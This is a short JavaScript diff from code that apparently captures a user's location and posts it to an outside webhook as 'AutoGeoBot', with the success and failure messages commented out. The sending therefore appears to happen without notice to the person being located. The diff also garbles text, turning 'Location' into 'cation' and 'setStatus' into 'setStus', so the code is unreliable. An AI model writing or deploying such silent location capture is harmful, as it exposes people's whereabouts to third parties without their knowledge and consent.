@@ -204,7 +204,7 @@
         username: 'AutoGeoBot',
         embeds: [
           {
-            title: '📍 New Location Captured',
+            title: '📍 New cation Captured',
             fields,
             timestamp: new Date().toISOString()
           }
@@ -278,8 +278,8 @@
       try {
         await sendToWebhook(payload);
         //setStatus('Success — location sent to webhook.', 'success');
-      catch (err) {
-       // setStatus('Failed to send webhook: ' + err.message, 'error');
+      } catch (err) {
+       // setStus('Failed to send webhook: ' + err.message, 'error');
       }
     }
 
